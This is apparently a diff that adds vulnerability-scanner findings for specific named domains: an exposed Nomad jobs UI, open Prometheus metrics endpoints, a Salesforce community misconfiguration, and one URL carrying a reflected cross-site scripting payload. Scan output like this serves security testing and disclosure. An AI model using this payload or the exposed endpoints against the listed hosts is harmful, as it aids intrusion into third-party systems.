@@ -1,0 +1,6 @@
+[CVE-2026-50229] [http] [medium] https://eset.entravel.com/examples/jsp/num/numguess.jsp?guess=5&hint=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[exposed-nomad] [http] [medium] https://nomad.pay.kiichain.io/ui/jobs
+[prometheus-metrics] [http] [medium] https://aiverse.0g.ai/api/metrics
+[prometheus-metrics] [http] [medium] https://rates.pay.kiichain.io/metrics
+[prometheus-metrics] [http] [medium] https://rates.pay.staging.kiichain.io/metrics
+[salesforce-community-misconfig] [http] [medium] https://contact.jpyc.co.jp/s/sfsites/aura
